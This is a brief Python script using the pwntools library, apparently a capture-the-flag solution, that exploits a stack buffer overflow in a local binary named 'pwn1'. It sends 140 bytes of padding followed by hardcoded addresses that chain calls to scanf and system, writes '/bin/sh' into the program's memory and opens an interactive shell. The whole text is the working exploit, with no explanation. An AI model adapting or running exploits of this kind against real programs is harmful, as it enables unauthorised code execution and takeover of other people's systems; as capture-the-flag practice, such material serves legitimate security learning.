from pwn import *
p=process('./pwn1')
r=raw_input()
scanf_addr=p32(0x80484f0)
sys_addr=p32(0x80484b0)
format_addr=p32(0x804888f)
data_addr=p32(0x804a034)
p.recvuntil('e:')
p.sendline('a'*140+scanf_addr+sys_addr+format_addr+data_addr)
p.recvuntil(':')
p.sendline('1')
p.sendline('/bin/sh\x00')
p.interactive()